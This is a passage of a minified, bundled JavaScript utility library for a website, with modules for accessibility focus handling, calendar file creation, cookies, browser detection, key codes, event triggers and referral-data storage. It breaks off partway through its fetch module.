require=function r(e,n,t){function o(i,f){if(!n[i]){if(!e[i]){var c="function"==typeof require&&require;if(!f&&c)return c(i,!0);if(u)return u(i,!0);var a=new Error("Cannot find module '"+i+"'");throw a.code="MODULE_NOT_FOUND",a}var p=n[i]={exports:{}};e[i][0].call(p.exports,(function(r){return o(e[i][1][r]||r)}),p,p.exports,r,e,n,t)}return n[i].exports}for(var u="function"==typeof require&&require,i=0;i<t.length;i++)o(t[i]);return o}({1:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}Object.defineProperty(exports,"__esModule",{value:!0}),Object.defineProperty(exports,"Log",{enumerable:!0,get:function get(){return _log.default}}),exports.cookie=exports.calendar=exports.asCookie=exports.aria=void 0,Object.defineProperty(exports,"env",{enumerable:!0,get:function get(){return _env.env}}),exports.fcsStorage=exports.eventTrigger=exports.event=void 0,Object.defineProperty(exports,"fetchJSON",{enumerable:!0,get:function get(){return _fetch.fetchJSON}}),Object.defineProperty(exports,"fetchWithTimeout",{enumerable:!0,get:function get(){return _fetch.fetchWithTimeout}}),exports.jsonRpc=exports.imageReplacer=void 0,Object.defineProperty(exports,"scrollToElement",{enumerable:!0,get:function get(){return _scroll.scrollToElement}}),Object.defineProperty(exports,"scrollToPosition",{enumerable:!0,get:function get(){return _scroll.scrollToPosition}}),exports.support=exports.string=void 0,Object.defineProperty(exports,"telLinkReplacer",{enumerable:!0,get:function get(){return _telLinkReplacer.default}}),exports.userInputType=exports.truncate=void 0;var aria=_interopRequireWildcard(require("./src/aria/aria.js"));exports.aria=aria;var asCookie=_interopRequireWildcard(require("./src/cookie/asCookie.js"));exports.asCookie=asCookie;var cookie=_interopRequireWildcard(require("./src/cookie/cookie.js"));exports.cookie=cookie;var _env=require("./src/env/env.js"),event=_interopRequireWildcard(require("./src/event/event.js"));exports.event=event;var eventTrigger=_interopRequireWildcard(require("./src/eventTrigger/eventTrigger.js"));exports.eventTrigger=eventTrigger;var fcsStorage=_interopRequireWildcard(require("./src/fcsStorage/fcsStorage.js"));exports.fcsStorage=fcsStorage;var _fetch=require("./src/fetch/fetch.js"),imageReplacer=_interopRequireWildcard(require("./src/imageReplacer/imageReplacer.js"));exports.imageReplacer=imageReplacer;var jsonRpc=_interopRequireWildcard(require("./src/jsonRpc/jsonRpc.js"));exports.jsonRpc=jsonRpc;var _scroll=require("./src/scroll/scroll.js"),string=_interopRequireWildcard(require("./src/string/string.js"));exports.string=string;var support=_interopRequireWildcard(require("./src/support/support.js"));exports.support=support;var truncate=_interopRequireWildcard(require("./src/truncate/truncate.js"));exports.truncate=truncate;var userInputType=_interopRequireWildcard(require("./src/userInputType/userInputType.js"));exports.userInputType=userInputType;var calendar=_interopRequireWildcard(require("./src/calendar/calendar.js"));exports.calendar=calendar;var _log=_interopRequireDefault(require("./src/log/log.js")),_telLinkReplacer=_interopRequireDefault(require("./src/telLinkReplacer/telLinkReplacer.js"));function _interopRequireDefault(obj){return obj&&obj.__esModule?obj:{default:obj}}function _getRequireWildcardCache(e){if("function"!=typeof WeakMap)return null;var r=new WeakMap,t=new WeakMap;return(_getRequireWildcardCache=function _getRequireWildcardCache(e){return e?t:r})(e)}function _interopRequireWildcard(e,r){if(!r&&e&&e.__esModule)return e;if(null===e||"object"!=_typeof(e)&&"function"!=typeof e)return{default:e};var t=_getRequireWildcardCache(r);if(t&&t.has(e))return t.get(e);var n={__proto__:null},a=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var u in e)if("default"!==u&&Object.prototype.hasOwnProperty.call(e,u)){var i=a?Object.getOwnPropertyDescriptor(e,u):null;i&&(i.get||i.set)?Object.defineProperty(n,u,i):n[u]=e[u]}return n.default=e,t&&t.set(e,n),n}},{"./src/aria/aria.js":2,"./src/calendar/calendar.js":3,"./src/cookie/asCookie.js":4,"./src/cookie/cookie.js":5,"./src/env/env.js":6,"./src/event/event.js":7,"./src/eventTrigger/eventTrigger.js":8,"./src/fcsStorage/fcsStorage.js":9,"./src/fetch/fetch.js":10,"./src/imageReplacer/imageReplacer.js":11,"./src/jsonRpc/jsonRpc.js":12,"./src/log/log.js":13,"./src/scroll/scroll.js":14,"./src/string/string.js":15,"./src/support/support.js":16,"./src/telLinkReplacer/telLinkReplacer.js":17,"./src/truncate/truncate.js":18,"./src/userInputType/userInputType.js":19}],2:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.showOthers=exports.restoreFocusable=exports.hideOthers=exports.findStashedFocusable=exports.findFocusable=exports.disassociateNodes=exports.disableFocusable=exports.canBeDisabled=exports.associateNodes=void 0;var hrefSaveAttr="data-ariasaved-href",ariaIdCount=-1,canBeDisabled=exports.canBeDisabled=function canBeDisabled(el){return"BUTTON"===el.tagName||"INPUT"===el.tagName},$$=function $$(sel){var el=arguments.length>1&&void 0!==arguments[1]?arguments[1]:document;return Array.from(el.querySelectorAll(sel))},tabIndexFilter=(exports.hideOthers=function hideOthers(el){el.removeAttribute("aria-hidden"),el.removeAttribute("tabindex"),function getSiblings(el){var parent=el.parentNode;return(parent?Array.from(parent.children):[]).filter((function(n){return 1===n.nodeType&&n!==el}))}(el).forEach((function(e){return e.setAttribute("aria-hidden","true")}));var parent=el.parentElement;return parent&&parent!==document.body&&hideOthers(parent),el},exports.showOthers=function showOthers(el){return $$("*[aria-hidden]").forEach((function(e){return e.removeAttribute("aria-hidden")})),el.setAttribute("aria-hidden","true"),el.setAttribute("tabindex","-1"),el},exports.associateNodes=function associateNodes(el,describedBy){var describer="string"==typeof describedBy?document.querySelector(describedBy):describedBy;if(describer){var originalId=describer.getAttribute("id"),newId=originalId||function getAriaGuid(){return"aria-id-"+(ariaIdCount+=1)}();originalId||describer.setAttribute("id",newId),el.setAttribute("aria-describedby",newId)}return el},exports.disassociateNodes=function disassociateNodes(el){return el.removeAttribute("aria-describedby"),el},function tabIndexFilter(el){var tabIndex=parseInt(el.getAttribute("tabindex")||"",10);return isNaN(tabIndex)||tabIndex>=0});exports.findFocusable=function findFocusable(el,count){var ignoreHidden=!(arguments.length>2&&void 0!==arguments[2])||arguments[2],focusables=$$("a,input,select,button,textarea,iframe,*[tabindex]",el).filter(tabIndexFilter),filtered=ignoreHidden?focusables.filter((function(e){return"none"!==e.style.display})):focusables;return count?filtered.slice(0,count):filtered},exports.findStashedFocusable=function findStashedFocusable(el){return $$("*[data-ariafocusable]",el)},exports.disableFocusable=function disableFocusable(elements){elements.forEach((function(el){if(el.setAttribute("data-ariafocusable","true"),canBeDisabled(el)){var curDisabled=el.disabled,savedValue=Boolean(el.getAttribute("data-ariasaved-disabled"))||curDisabled?"true":"";el.setAttribute("data-ariasaved-disabled",savedValue),el.disabled=!0}var curAriaDisabled=el.getAttribute("aria-disabled")||"",oldAriaDisabled=el.getAttribute("data-ariasaved-ariadisabled")||"";el.setAttribute("data-ariasaved-ariadisabled",oldAriaDisabled||curAriaDisabled),el.setAttribute("aria-disabled","true");var curHref=el.getAttribute("href")||"",oldHref=el.getAttribute(hrefSaveAttr)||"";curHref&&(el.setAttribute(hrefSaveAttr,oldHref||curHref),el.removeAttribute("href"));var curTabIndex=el.getAttribute("tabindex")||"",oldTabIndex=el.getAttribute("data-ariasaved-tabindex")||"";el.setAttribute("data-ariasaved-tabindex",oldTabIndex||curTabIndex),el.setAttribute("tabindex","-1")}))},exports.restoreFocusable=function restoreFocusable(elements){elements.forEach((function(el){if(el.removeAttribute("data-ariafocusable"),canBeDisabled(el)){var curDisabled=el.disabled,oldDisabled=el.getAttribute("data-ariasaved-disabled");curDisabled&&(el.disabled=Boolean(oldDisabled)),el.removeAttribute("data-ariasaved-disabled")}var curAriaDisabled=el.getAttribute("aria-disabled")||"",oldAriaDisabled=el.getAttribute("data-ariasaved-ariadisabled")||"";"true"===curAriaDisabled&&(oldAriaDisabled?el.setAttribute("aria-disabled",oldAriaDisabled):el.removeAttribute("aria-disabled")),el.removeAttribute("data-ariasaved-ariadisabled");var curHref=el.getAttribute("href")||"",oldHref=el.getAttribute(hrefSaveAttr)||"";""===curHref&&oldHref&&el.setAttribute("href",oldHref),el.removeAttribute(hrefSaveAttr);var curTabIndex=el.getAttribute("tabindex")||"",oldTabIndex=el.getAttribute("data-ariasaved-tabindex")||"";parseInt(curTabIndex,10)<0&&(oldTabIndex?el.setAttribute("tabindex",oldTabIndex):el.removeAttribute("tabindex")),el.removeAttribute("data-ariasaved-tabindex")}))}},{}],3:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function ownKeys(e,r){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);r&&(o=o.filter((function(r){return Object.getOwnPropertyDescriptor(e,r).enumerable}))),t.push.apply(t,o)}return t}function _slicedToArray(arr,i){return function _arrayWithHoles(arr){if(Array.isArray(arr))return arr}(arr)||function _iterableToArrayLimit(r,l){var t=null==r?null:"undefined"!=typeof Symbol&&r[Symbol.iterator]||r["@@iterator"];if(null!=t){var e,n,i,u,a=[],f=!0,o=!1;try{if(i=(t=t.call(r)).next,0===l){if(Object(t)!==t)return;f=!1}else for(;!(f=(e=i.call(t)).done)&&(a.push(e.value),a.length!==l);f=!0);}catch(r){o=!0,n=r}finally{try{if(!f&&null!=t.return&&(u=t.return(),Object(u)!==u))return}finally{if(o)throw n}}return a}}(arr,i)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr,i)||function _nonIterableRest(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}function _defineProperty(obj,key,value){return(key=function _toPropertyKey(arg){var key=function _toPrimitive(input,hint){if("object"!==_typeof(input)||null===input)return input;var prim=input[Symbol.toPrimitive];if(void 0!==prim){var res=prim.call(input,hint||"default");if("object"!==_typeof(res))return res;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===hint?String:Number)(input)}(arg,"string");return"symbol"===_typeof(key)?key:String(key)}(key))in obj?Object.defineProperty(obj,key,{value:value,enumerable:!0,configurable:!0,writable:!0}):obj[key]=value,obj}Object.defineProperty(exports,"__esModule",{value:!0}),exports.createEventFileURL=exports.createEvent=void 0;exports.createEvent=function createEvent(_ref){var _event,title=_ref.title,body=_ref.body,start=_ref.start,end=_ref.end,timeZone=_ref.timeZone,_ref$URL=_ref.URL,URL=void 0===_ref$URL?"":_ref$URL,startKey="DTSTART;TZID=".concat(timeZone),endKey="DTEND;TZID=".concat(timeZone),event=(_defineProperty(_event={BEGIN:"VEVENT",SUMMARY:title,STATUS:"CONFIRMED"},startKey,start),_defineProperty(_event,endKey,end),_defineProperty(_event,"DESCRIPTION",body),_defineProperty(_event,"URL",URL),_defineProperty(_event,"END","VEVENT"),_event),stringify=function stringify(acc,line){var _line=_slicedToArray(line,2),key=_line[0],val=_line[1];return"".concat(acc).concat(key,":").concat(val,"\n")},calStartString=Object.entries({BEGIN:"VCALENDAR",VERSION:"2.0",CALSCALE:"GREGORIAN"}).reduce(stringify,""),eventString=Object.entries(event).reduce(stringify,""),calEndString=Object.entries({END:"VCALENDAR"}).reduce(stringify,"");return"".concat(calStartString).concat(eventString).concat(calEndString)},exports.createEventFileURL=function createEventFileURL(event){var eventFile=new File([event],"",function _objectSpread(e){for(var r=1;r<arguments.length;r++){var t=null!=arguments[r]?arguments[r]:{};r%2?ownKeys(Object(t),!0).forEach((function(r){_defineProperty(e,r,t[r])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):ownKeys(Object(t)).forEach((function(r){Object.defineProperty(e,r,Object.getOwnPropertyDescriptor(t,r))}))}return e}({type:"text/calendar"},arguments.length>1&&void 0!==arguments[1]?arguments[1]:{}));return window.URL.createObjectURL(eventFile)}},{}],4:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.set=exports.getMapName=exports.getEnvName=exports.get=void 0;var _cookie=require("./cookie.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}exports.getEnvName=function getEnvName(cookieStr){var suffix=window.envCookieSuffix,prefix=-1===cookieStr.indexOf("as_")?"as_":"";return suffix?prefix+cookieStr+suffix:cookieStr};var getMapName=exports.getMapName=function getMapName(cookieStr){var cookieMap=window.cookieMap;return cookieMap&&"object"===_typeof(cookieMap)&&cookieStr in cookieMap?cookieMap[cookieStr]:cookieStr};exports.set=function set(key,value){var opts=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{};return(0,_cookie.set)(getMapName(key),value,opts)},exports.get=function get(key){return(0,_cookie.get)(getMapName(key))}},{"./cookie.js":5}],5:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.set=exports.get=void 0;var _env=require("../env/env.js");function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}exports.set=function set(key,value){var opts=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{},expiresOn=function expiresToDate(expires){if("number"==typeof expires){var date=new Date;return date.setTime(date.getTime()+24*(expires||0)*60*60*1e3),date}return expires}(null===value?-1:opts.expires);value="object"===_typeof(value=null===value?"":value)?JSON.stringify(value):value;var expires=expiresOn?"; expires="+expiresOn.toUTCString():"",path=opts.path?"; path="+opts.path:"",domain=opts.domain?"; domain="+opts.domain:"",secure=opts.secure?"; secure":"",sameSite=opts.sameSite?"; samesite="+opts.sameSite:"";_env.env.setCookie(key+"="+encodeURIComponent(value)+expires+path+domain+secure+sameSite)},exports.get=function get(key){var val=null;if(!key)return val;for(var cookies=(_env.env.getCookies()||"").split(";"),i=0;i<cookies.length;i++){var cookie=(cookies[i]||"").trim();if(cookie.substring(0,key.length+1)===key+"="){val=decodeURIComponent(cookie.substring(key.length+1));break}}if(val&&val.match(/^\s*\{/))try{val=JSON.parse(val)}catch(e){}return val}},{"../env/env.js":6}],6:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.env=exports.default=void 0;var env=exports.env={userAgent:function userAgent(ua){var isWebKit=/(AppleWebkit)/i.test(ua),isChrome=/Chrome/.test(ua)&&/Google Inc/.test(navigator.vendor),isAndroidMobile=/Android.*Mobile|Mobile.*Android/i.test(ua),oldIe=/MSIE ([0-9]{1,}[.0-9]{0,})/.exec(ua),newIe=/Trident\/.*rv:([0-9]{1,}[.0-9]{0,})/.exec(ua),allIe=oldIe&&oldIe[1]||newIe&&newIe[1],isIpad=/(ipad)/i.test(ua),isMobileIos=/(iphone|ipod)/i.test(ua)&&isWebKit,iosMatch=isMobileIos||isIpad?ua.match(/os ([\d_]*)/i):null,isIosChrome=/CriOS/.test(ua)&&isMobileIos,iosVersionStr=iosMatch&&iosMatch[1]||"0";return{isMobileIos:isMobileIos,isIpad:isIpad,isAndroidMobile:isAndroidMobile,isIosChrome:isIosChrome,userAgent:ua,isPhantom:/Phantom/i.test(ua),isFirefox:/(Firefox)/i.test(ua),isChrome:/(Chrome)/i.test(ua),isSafari:/(Safari)/i.test(ua)&&!/(Chrome)/i.test(ua),isHandheldPhone:isMobileIos||isAndroidMobile,iosVersion:parseFloat(iosVersionStr.replace("_",".")),isIe:Boolean(allIe),ieVersion:parseFloat(allIe||"0"),isAndroidInternet:isAndroidMobile&&!isChrome&&isWebKit,androidVersion:isAndroidMobile?parseFloat(ua.slice(ua.indexOf("Android")+8)):0}},getReferrer:function getReferrer(){return document.referrer},getUrlHash:function getUrlHash(){return window.location.hash},setUrlHash:function setUrlHash(hash){window.location.hash=hash},doRedirect:function doRedirect(url){window.location.href=url},isOnline:function isOnline(){return window.navigator.onLine},getWindowQueryString:function getWindowQueryString(){return window.location.search},getCurrentPathname:function getCurrentPathname(){return window.location.pathname},getViewportScrollX:function getViewportScrollX(){return window.scrollX},getViewportScrollY:function getViewportScrollY(){return window.scrollY},getViewportHeight:function getViewportHeight(){return window.innerHeight||document.documentElement.clientHeight},getViewportWidth:function getViewportWidth(){return window.innerWidth||document.documentElement.clientWidth},submit:function submit(form){(form&&"get"in form?form.get(0):form).submit()},getFocused:function getFocused(){return document.activeElement},focus:function focus(element){return element.focus()},pixelRatio:window.devicePixelRatio,devicePixelRatio:function devicePixelRatio(newRatio){return env.pixelRatio=void 0!==newRatio?newRatio:env.pixelRatio,env.pixelRatio},selectedText:function selectedText(){var sel=window.getSelection();return sel?sel.toString():""},getCookies:function getCookies(){return document.cookie||""},setCookie:function setCookie(cookie){document.cookie=cookie}};exports.default=env},{}],7:[function(require,module,exports){"use strict";function _slicedToArray(arr,i){return function _arrayWithHoles(arr){if(Array.isArray(arr))return arr}(arr)||function _iterableToArrayLimit(r,l){var t=null==r?null:"undefined"!=typeof Symbol&&r[Symbol.iterator]||r["@@iterator"];if(null!=t){var e,n,i,u,a=[],f=!0,o=!1;try{if(i=(t=t.call(r)).next,0===l){if(Object(t)!==t)return;f=!1}else for(;!(f=(e=i.call(t)).done)&&(a.push(e.value),a.length!==l);f=!0);}catch(r){o=!0,n=r}finally{try{if(!f&&null!=t.return&&(u=t.return(),Object(u)!==u))return}finally{if(o)throw n}}return a}}(arr,i)||function _unsupportedIterableToArray(o,minLen){if(!o)return;if("string"==typeof o)return _arrayLikeToArray(o,minLen);var n=Object.prototype.toString.call(o).slice(8,-1);"Object"===n&&o.constructor&&(n=o.constructor.name);if("Map"===n||"Set"===n)return Array.from(o);if("Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n))return _arrayLikeToArray(o,minLen)}(arr,i)||function _nonIterableRest(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}()}function _arrayLikeToArray(arr,len){(null==len||len>arr.length)&&(len=arr.length);for(var i=0,arr2=new Array(len);i<len;i++)arr2[i]=arr[i];return arr2}Object.defineProperty(exports,"__esModule",{value:!0}),exports.keys=exports.keyNames=exports.keyCodes=exports.isNumpadNumKey=exports.isMetaKey=exports.isAlphaNumKey=exports.StandardDeferredInputTimeout=exports.Mouse=void 0;var keys=exports.keys={Backspace:8,Tab:9,Clear:12,Return:13,Shift:16,Ctrl:17,Alt:18,Esc:27,ArrowLeft:37,ArrowUp:38,ArrowRight:39,ArrowDown:40,Delete:46,Home:36,End:35,PageUp:33,PageDown:34,Insert:45,CapsLock:20,LeftCommand:91,RightCommand:93,MozillaCommand:224,RightWindowsStart:92,Pause:19,Space:32,Help:47,LeftWindow:91,Select:93,NumPad0:96,NumPad1:97,NumPad2:98,NumPad3:99,NumPad4:100,NumPad5:101,NumPad6:102,NumPad7:103,NumPad8:104,NumPad9:105,NumPadMultiply:106,NumPadPlus:107,NumPadEnter:108,NumPadMinus:109,NumPadPeriod:110,NumPadDivide:111,F1:112,F2:113,F3:114,F4:115,F5:116,F6:117,F7:118,F8:119,F9:120,F10:121,F11:122,F12:123,F13:124,F14:125,F15:126,NumLock:144,ScrollLock:145},keyCodes=exports.keyCodes={};Object.entries(keys).forEach((function(_ref){var _ref2=_slicedToArray(_ref,2),key=_ref2[0],val=_ref2[1];return keyCodes[val]=key}));exports.keyNames={Unidentified:"Unidentified",Alt:"Alt",AltGraph:"AltGraph",CapsLock:"CapsLock",Control:"Control",Fn:"Fn",FnLock:"FnLock",Meta:"Meta",NumLock:"NumLock",ScrollLock:"ScrollLock",Shift:"Shift",Symbol:"Symbol",SymbolLock:"SymbolLock",Enter:"Enter",Tab:"Tab",Space:" ",ArrowDown:"ArrowDown",ArrowLeft:"ArrowLeft",ArrowRight:"ArrowRight",ArrowUp:"ArrowUp",End:"End",Home:"Home",PageDown:"PageDown",PageUp:"PageUp",Backspace:"Backspace",Clear:"Clear",Copy:"Copy",CrSel:"CrSel",Cut:"Cut",Delete:"Delete",EraseEof:"EraseEof",ExSel:"ExSel",Insert:"Insert",Paste:"Paste",Redo:"Redo",Undo:"Undo",Accept:"Accept",Again:"Again",Attn:"Attn",Cancel:"Cancel",ContextMenu:"ContextMenu",Escape:"Escape",Execute:"Execute",Find:"Find",Help:"Help",Pause:"Pause",Play:"Play",Props:"Props",Select:"Select",ZoomIn:"ZoomIn",ZoomOut:"ZoomOut"},exports.Mouse={Left:1,Right:3},exports.isMetaKey=function isMetaKey(event){return event.keyCode===keys.Tab||event.keyCode===keys.Clear||event.keyCode===keys.Return||event.keyCode===keys.Shift||event.keyCode===keys.Ctrl||event.keyCode===keys.Alt||event.keyCode===keys.Esc||event.keyCode===keys.ArrowLeft||event.keyCode===keys.ArrowUp||event.keyCode===keys.ArrowRight||event.keyCode===keys.ArrowDown||event.keyCode===keys.Home||event.keyCode===keys.End||event.keyCode===keys.PageUp||event.keyCode===keys.PageDown||event.keyCode===keys.Insert||event.keyCode===keys.CapsLock||event.keyCode===keys.LeftCommand||event.keyCode===keys.RightCommand||event.keyCode===keys.MozillaCommand||event.keyCode===keys.RightWindowsStart},exports.StandardDeferredInputTimeout=333;var isNumpadNumKey=exports.isNumpadNumKey=function isNumpadNumKey(ev){return 96<=ev.keyCode&&ev.keyCode<=111};exports.isAlphaNumKey=function isAlphaNumKey(ev){return isNumpadNumKey(ev)||!(ev.keyCode in keyCodes)}},{}],8:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.stop=exports.setup=void 0;var _event=require("../event/event.js"),parser=/^(\S+)\s*(.+)?$/,isSetup=!1,parsedStrings={},eventTrigger=function eventTrigger(triggerEl,action,ev){var actions=function parseTrigger(action){if(action=action.trim(),!parsedStrings[action]){var triggers=action.split(",").map((function(p){return p.trim()})).filter((function(p){return!!p})).map((function(part){var tokens=part.match(parser);return{type:tokens&&tokens[1],sel:tokens&&tokens[2]}}));parsedStrings[action]=triggers}return parsedStrings[action]}(action),context=null;actions.forEach((function(_ref){var type=_ref.type,sel=_ref.sel;if("preventDefault"===type)ev.preventDefault();else if("focus"===type||"click"===type){context=context||function getContext(fromEl){for(var el=fromEl;el;el=el.parentElement)if(el.hasAttribute("data-trigger-context"))return el;return document.body}(triggerEl);var targets=sel?function $$(sel){var el=arguments.length>1&&void 0!==arguments[1]?arguments[1]:document;return Array.from(el.querySelectorAll(sel))}(sel,context):[triggerEl];targets.forEach((function(target){return target[type]?target[type]():null}))}}))},eventBubble=function eventBubble(ev){for(var initTarget=ev.target,code=(ev&&"keyCode"in ev?ev.keyCode:null),hasCode=null!==code,codeName=null!==code&&_event.keyCodes[code],target=initTarget;target;target=target.parentElement){if(target&&target.hasAttribute("data-trigger-stoppropagation"))return;var attrValue=!hasCode&&target.getAttribute("".concat("data-trigger","-").concat(ev.type))||hasCode&&target.getAttribute("".concat("data-trigger","-").concat(code))||hasCode&&target.getAttribute("".concat("data-trigger","-").concat(codeName));attrValue&&eventTrigger(target,attrValue,ev)}};exports.setup=function setup(){isSetup||(document.addEventListener("click",eventBubble),document.addEventListener("focusin",eventBubble),document.addEventListener("focusout",eventBubble),document.addEventListener("keydown",eventBubble),isSetup=!0)},exports.stop=function stop(){document.removeEventListener("click",eventBubble),document.removeEventListener("focusin",eventBubble),document.removeEventListener("focusout",eventBubble),document.removeEventListener("keydown",eventBubble),isSetup=!1}},{"../event/event.js":7}],9:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.storeFcsData=exports.setFcsDataForQbe=exports.setAcceptCookie=exports.flushFcsData=exports.appendFcsData=void 0;var getReferrerDomain=function getReferrerDomain(){var ref=document.referrer,refUrl="",refUrlArray=null;return ref?(null!==(refUrlArray=ref.split("/"))&&refUrlArray.length>=3&&(refUrl=refUrlArray[2]),refUrl||""):""},localStorageToDom=function localStorageToDom(name,localKey){try{var fcs=document.querySelector('[name="'+name+'"]'),domValue=fcs?fcs.getAttribute("value"):null;if(fcs&&!domValue){var value=window.localStorage.getItem(localKey);fcs.setAttribute("value",value||"")}else fcs&&domValue&&fcs.setAttribute("value",decodeURIComponent(domValue));window.localStorage.removeItem(localKey)}catch(e){}},localStorageToUrl=function localStorageToUrl(urlKey,url,localKey){try{var localVal=window.localStorage.getItem(localKey),hasQuery=url.indexOf("?")>=0;localVal&&(url+=hasQuery?"&":"?",url+=urlKey+"="+encodeURIComponent(localVal))}catch(e){}return url};exports.setFcsDataForQbe=function setFcsDataForQbe(){localStorageToDom("as-fcs1","as-fcs1"),localStorageToDom("as-fcs2","as-fcs2")},exports.storeFcsData=function storeFcsData(){try{if(null===window.localStorage.getItem("as-fcs1")){var data={RD:getReferrerDomain(),LPU:document.URL,AC:!1,SST:Math.round((new Date).getTime()/1e3)};window.localStorage.setItem("as-fcs1",JSON.stringify(data)),window.localStorage.setItem("as-fcs2","1")}else{var curCount=parseInt(window.localStorage.getItem("as-fcs2")||"0",10);window.localStorage.setItem("as-fcs2",(curCount+1).toString())}}catch(e){}},exports.appendFcsData=function appendFcsData(url){return url=localStorageToUrl("f1",url,"as-fcs1"),url=localStorageToUrl("f2",url,"as-fcs2")},exports.flushFcsData=function flushFcsData(){try{window.localStorage.removeItem("as-fcs1"),window.localStorage.removeItem("as-fcs2")}catch(e){}},exports.setAcceptCookie=function setAcceptCookie(){try{var fcsData=window.localStorage.getItem("as-fcs1");fcsData&&(fcsData=JSON.parse(fcsData,(function(k,v){return"AC"===k||v})),window.localStorage.setItem("as-fcs1",JSON.stringify(fcsData)))}catch(e){}}},{}],10:[function(require,module,exports){"use strict";function _typeof(o){return _typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(o){return typeof o}:function(o){return o&&"function"==typeof Symbol&&o.constructor===Symbol&&o!==Symbol.prototype?"symbol":typeof o},_typeof(o)}function _regeneratorRuntime(){_regeneratorRuntime=function _regeneratorRuntime(){return e};var t,e={},r=Object.prototype,n=r.hasOwnProperty,o=Object.defineProperty||function(t,e,r){t[e]=r.value},i="function"==typeof Symbol?Symbol:{},a=i.iterator||"@@iterator",c=i.asyncIterator||"@@asyncIterator",u=i.toStringTag||"@@toStringTag";function define(t,e,r){return Object.defineProperty(t,e,{value:r,enumerable:!0,configurable:!0,writable:!0}),t[e]}try{define({},"")}catch(t){define=function define(t,e,r){return t[e]=r}}function wrap(t,e,r,n){var i=e&&e.prototype instanceof Generator?e:Generator,a=Object.create(i.prototype),c=new Context(n||[]);return o(a,"_invoke",{value:makeInvokeMethod(t,r,c)}),a}function tryCatch(t,e,r){try{return{type:"normal",arg:t.call(e,r)}}catch(t){return{type:"throw",arg:t}}}e.wrap=wrap;var h="suspendedStart",l="suspendedYield",f="executing",s="completed",y={};function Generator(){}function GeneratorFunction(){}function GeneratorFunctionPrototype(){}var p={};define(p,a,(function(){return this}));var d=Object.getPrototypeOf,v=d&&d(d(values([])));v&&v!==r&&n.call(v,a)&&(p=v);var g=GeneratorFunctionPrototype.prototype=Generator.prototype=Object.create(p);function defineIteratorMethods(t){["next","throw","return"].forEach((function(e){define(t,e,(function(t){return this._invoke(e,t)}))}))}function AsyncIterator(t,e){function invoke(r,o,i,a){var c=tryCatch(t[r],t,o);if("throw"!==c.type){var u=c.arg,h=u.value;return h&&"object"==_typeof(h)&&n.call(h,"__await")?e.resolve(h.__await).then((function(t){invoke("next",t,i,a)}),(function(t){invoke("throw",t,i,a)})):e.resolve(h).then((function(t){u.value=t,i(u)}),(function(t){return invoke("throw",t,i,a)}))}a(c.arg)}var r;o(this,"_invoke",{value:function value(t,n){function callInvokeWithMethodAndArg(){return new e((function(e,r){invoke(t,n,e,r)}))}return r=r?r.then(callInvokeWithMethodAndArg,callInvokeWithMethodAndArg):callInvokeWithMethodAndArg()}})}function makeInvokeMethod(e,r,n){var o=h;return function(i,a){if(o===f)throw new Error("Generator is already running");if(o===s){if("throw"===i)throw a;return{value:t,done:!0}}for(n.method=i,n.arg=a;;){var c=n.delegate;if(c){var u=maybeInvokeDelegate(c,n);if(u){if(u===y)continue;return u}}if("next"===n.method)n.sent=n._sent=n.arg;else if("throw"===n.method){if(o===h)throw o=s,n.arg;n.dispatchException(n.arg)}else"return"===n.method&&n.abrupt("return",n.arg);o=f;var p=tryCatch(e,r,n);if("normal"===p.type){if(o=n.done?s:l,p.arg===y)continue;return{value:p.arg,done:n.done}}"throw"===p.type&&(o=s,n.method="throw",n.arg=p.arg)}}}function maybeInvokeDelegate(e,r){var n=r.method,o=e.iterator[n];if(o===t)return r.delegate=null,"throw"===n&&e.iterator.return&&(r.method="return",r.arg=t,maybeInvokeDelegate(e,r),"throw"===r.method)||"return"!==n&&(r.method="throw",r.arg=new TypeError("The iterator does not provide a '"+n+"' method")),y;var i=tryCatch(o,e.iterator,r.arg);if("throw"===i.type)return r.method="throw",r.arg=i.arg,r.delegate=null,y;var 